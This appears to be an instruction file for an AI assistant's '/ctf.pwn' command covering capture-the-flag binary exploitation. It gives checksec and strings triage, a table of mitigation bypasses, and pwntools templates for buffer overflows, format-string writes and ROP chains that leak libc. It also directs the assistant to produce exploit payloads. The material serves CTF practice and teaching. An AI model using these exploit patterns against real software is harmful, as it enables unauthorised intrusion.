# /ctf.pwn - Binary Exploitation Challenge Assistance

Help solve binary exploitation (pwn) challenges.

## When to Use

Use this command when:

- Challenge provides an ELF binary
- Challenge involves buffer overflows
- Need to exploit format strings
- ROP chains or shellcode required
- Challenge has a remote service to exploit

## First Steps

1. **Check binary security**

   ```bash
   checksec ./binary
   file ./binary
   ```

2. **Extract strings**

   ```bash
   strings ./binary | grep -i "flag\|password\|win"
   ```

3. **Run and observe**

   ```bash
   ./binary
   ltrace ./binary
   strace ./binary
   ```

## Security Mitigations

| Mitigation | Impact | Bypass |
|------------|--------|--------|
| NX/DEP | No exec on stack | ROP chains |
| ASLR | Random addresses | Leak address, brute force |
| Stack Canary | Stack smash detection | Leak canary, format string |
| PIE | Code at random address | Leak PIE base |
| RELRO | GOT protection | Partial: overwrite GOT |

## Common Vulnerability Patterns

### Buffer Overflow

```python
from pwn import *

p = process('./vuln')
payload = b'A' * offset_to_ret
payload += p64(win_function)
p.sendline(payload)
p.interactive()
```

### Format String

```python
# Leak stack values
payload = b'%p.' * 20

# Write to address (32-bit)
payload = p32(target_addr) + b'%n'

# Arbitrary write (use pwntools fmtstr)
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target: value})
```

### Return Oriented Programming (ROP)

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Build chain
payload = flat([
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],  # leak libc
    elf.plt['puts'],
    elf.symbols['main']  # return to main
])
```

## Key Tools

```bash
# Check available tools
ctf check --category pwn

# Security properties
checksec ./binary

# Find gadgets
ROPgadget --binary ./binary
ROPgadget --binary ./binary --ropchain

# One gadget (libc)
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# GDB with pwndbg
gdb ./binary
```

## pwntools Template

```python
#!/usr/bin/env python3
from pwn import *

# Context
context.binary = elf = ELF('./binary')
context.log_level = 'debug'

# libc = ELF('./libc.so.6')

def conn():
    if args.REMOTE:
        return remote('host', port)
    return process(elf.path)

p = conn()

# Exploit here
payload = b'A' * 64
p.sendline(payload)

p.interactive()
```

## GDB Commands (pwndbg)

```bash
# Find offset
cyclic 200
# After crash: cyclic -l <value>

# Check protections
checksec

# Find string
search -s "flag"

# Heap analysis
heap
bins

# Break at function
b *main
b *0x401234
```

## Response Format

When responding to /ctf.pwn:

1. **Binary Analysis**: Architecture, security features
2. **Vulnerability**: What bug exists (overflow, format string, etc.)
3. **Exploit Strategy**: How to leverage the vulnerability
4. **Payload**: The actual exploit code/script
5. **Flag**: Result from exploitation

## Related Commands

- `/ctf.analyze` - Initial file analysis
- `/ctf.reverse` - For understanding binary logic
